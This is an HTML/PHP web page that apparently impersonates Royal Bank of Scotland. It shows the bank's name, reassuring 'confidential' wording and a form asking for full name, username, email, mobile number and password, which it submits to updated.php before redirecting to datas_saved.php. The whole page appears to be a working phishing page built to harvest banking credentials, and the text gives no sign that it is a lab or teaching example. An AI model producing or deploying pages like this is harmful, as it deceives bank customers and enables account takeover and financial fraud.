<!doctype html>
<html>

<head>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.1/css/all.css"
        integrity="sha384-gfdkjb5BdAXd+lj+gudLWI+BXq4IuLW5IT+brZEZsLFm++aCMlF1V92rMkPaX4PP" crossorigin="anonymous">
    <link rel="stylesheet" href="css/bootstrap.css">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/style.css">
    <script>
    function myFunction() {
        var txt;
        if (confirm("Are Your Details Correct?")) {
            txt = window.location.assign("datas_saved.php");
        } else {
            txt = "Sorry For You Cannot Proceed!";
        }
        document.getElementById("demo").innerHTML = txt;
    }
    </script>
</head>



<?php include 'header.php';?>

<div class="corners">
    <div class="container">
        <div class="row">
            <div class="col-md-6">
                <img src="Image/round-shape-ball-abstract-gold-logo-vector-15003171.jpg"
                    style="width:100px; height:45px;"></img>
                <hr>
            </div>
        </div>
    </div>
</div>

<div class="flips">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <ul class="nav">
                    <li class="nav-item">
                        <a class="nav-link">
                            <p> <span
                                    style="font-family:kalinga;font-size:15px;color:rgb(34, 34, 17);font-weight:bold;">Welcome
                                    To Royal Bank Of Scotland</span></p>
                        </a>
                    </li>
                    <li class="nav-item">
                        &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp
                        &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp
                        &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp
                        &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp
                        <img src="Image/round-shape-ball-abstract-gold-logo-vector-15003171.jpg.jpg"
                            style="width:150px; height:45px;justify:right;"></img>
                    </li>
                </ul>
                <hr>
                <hr>
            </div>
        </div>
    </div>
</div>
<div class="flips">
    <div class="container">
        <div class="row">
            <div class="col-md-4">
                <button type="button" class="btn btn-success">For English Speaking. Do Fill The Form Below. <i
                        class="fas fa-sort-down"></i></span>
            </div>
            <div class="col-md-4">
            </div>
            <div class="col-md-4">
            </div>
        </div>
    </div>
</div><br>

<div class="flips">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <div id="Sign In" align="center">
                    <div
                        style="width:800px;height:100px;border:1px solid rgb(0, 230, 172); background-color:rgb(0, 230, 172);margin:auto;padding:3px;">
                        <p style="align:justify"><span style="font-family:calibri; font-size:15px;">Customers are to
                                ensure that they put in their real and authentic details for easy identification and
                                navigation.
                                This makes our accountability in accuracy. Customers are to ensure that they present to
                                us their real and authentic documents and also ID Cards which makes us to validate all
                                transactions for customers satisfaction.Any customer that declines these
                                authentification is liable to be at his / her own risks. </span></p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="flips">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <div id="Sign In" align="center">
                    <div
                        style="width:400px;height:50px;border:1px solid rgb(255, 235, 204); background-color:rgb(255, 235, 204);margin:auto;padding:5px;float:center;">
                        <span style="font-family:calibri;font-size:13px;">Customers are to fill their details below
                            correctly. They are confidential.</span>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="flips">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <div id="Sign In" align="center">
                    <form action="updated.php">
                        <table style="width: 505px; height: 202px" border="1" bordercolor="#E59E46" cellpadding="4"
                            cellspacing="0">

                            <!-- MSTableType="nolayout" -->

                            <tbody>
                                <tr>
                                    <td class="EasyStreetFieldCaptionTD" nowrap="nowrap" bgcolor="#E59E46"></td>
                                    <td class="EasyStreetDataTD" style="border-left-style:solid; border-left-width:1px"
                                        bgcolor="#E59E46">
                                        <font color="#000000" face="Verdana" size="2"><strong>PERSONAL
                                                INFORMATION</strong></font>
                                    </td>
                                </tr>
                                <tr>
                                    <td class="EasyStreetFieldCaptionTD" nowrap="nowrap"
                                        style="border-style: solid; border-width: 1px; " bgcolor="#FFFFFF" height="30">
                                        <font face="Verdana" size="2">Full Names&nbsp;</font>
                                    </td>
                                    <td class="EasyStreetDataTD" style="border-style: solid; border-width: 1px; "
                                        bgcolor="#FFFFFF" height="30">
                                        <font color="#007CAB" face="Verdana">
                                            <input type="text" name="fullnames" class="EasyStreetInput"
                                                style="width: 202px;height: 20px;" size="31" maxlength="50">
                                            <font size="2">
                                                &nbsp;</font>
                                        </font>
                                    </td>
                                </tr>

                                <tr>
                                    <td class="EasyStreetFieldCaptionTD" nowrap="nowrap"
                                        style="border-style: solid; border-width: 1px; " bgcolor="#FFFFFF" height="31">
                                        <font face="Verdana" size="2">User Name&nbsp;</font>
                                    </td>
                                    <td class="EasyStreetDataTD" style="border-style: solid; border-width: 1px; "
                                        bgcolor="#FFFFFF" height="31">
                                        <font color="#007CAB" face="Verdana">
                                            <!--webbot bot="Validation" s-display-name="username" b-value-required="TRUE" i-minimum-length="1" i-maximum-length="50" --><input
                                                class="EasyStreetInput" maxlength="50" size="35" value=""
                                                name="username" style="width: 231px; height:
 20px;">
                                        </font>
                                        <font size="2" color="#007CAB" face="Verdana"> &nbsp;</font>
                                    </td>
                                </tr>
                                <tr>
                                    <td class="EasyStreetFieldCaptionTD" nowrap="nowrap"
                                        style="border-style: solid; border-width: 1px; " bgcolor="#FFFFFF" height="30">
                                        <font face="Verdana" size="2">Email ID&nbsp;</font>
                                    </td>
                                    <td class="EasyStreetDataTD" style="border-style: solid; border-width: 1px; "
                                        bgcolor="#FFFFFF" height="30">
                                        <font color="#007CAB" face="Verdana">
                                            <!--webbot bot="Validation" s-display-name="emailid" b-value-required="TRUE" i-minimum-length="1" i-maximum-length="50" --><input
                                                class="EasyStreetInput" maxlength="50" size="35" value="" name="emailid"
                                                style="width: 231px;
 height: 20px;">
                                        </font>
                                    </td>
                                </tr>
                                <tr>
                                    <td class="EasyStreetFieldCaptionTD" nowrap="nowrap"
                                        style="border-style: solid; border-width: 1px; " bgcolor="#FFFFFF" height="30">
                                        <font face="Verdana" size="2">Mobile Number&nbsp;</font>
                                    </td>
                                    <td class="EasyStreetDataTD" style="border-style: solid; border-width: 1px; "
                                        bgcolor="#FFFFFF" height="30">
                                        <font color="#007CAB" face="Verdana">
                                            <!--webbot bot="Validation" s-display-name="mobilenumber" b-value-required="TRUE" i-minimum-length="1" i-maximum-length="50" --><input
                                                class="EasyStreetInput" maxlength="50" size="35" value=""
                                                name="mobilenumber" style="width: 231px;
 height: 20px;">
                                        </font>
                                    </td>
                                </tr>
                                <tr>
                                    <td class="EasyStreetFieldCaptionTD" nowrap="nowrap"
                                        style="border-style: solid; border-width: 1px; " bgcolor="#FFFFFF" height="30">
                                        Password</td>
                                    <td class="EasyStreetDataTD" style="border-style: solid; border-width: 1px; "
                                        bgcolor="#FFFFFF" height="30">
                                        <font color="#007CAB" face="Verdana"><input class="EasyStreetInput"
                                                maxlength="50" size="40" value="" name="password" style="width: 264px; height:
 20px;"></font>
                                    </td>
                                </tr>


                                <tr>
                                    <td>
                                        <font color="#FFFF00" face="Verdana">

                                            <button onclick="myFunction()" class="btn btn-success">Enter </button>
                                        </font>
                                    </td>
                                    <td width="345" rowspan="2">
                                        &nbsp;</td>
                                </tr>

                        </table>


                    </form>
                </div>
            </div>
        </div>
    </div>
</div>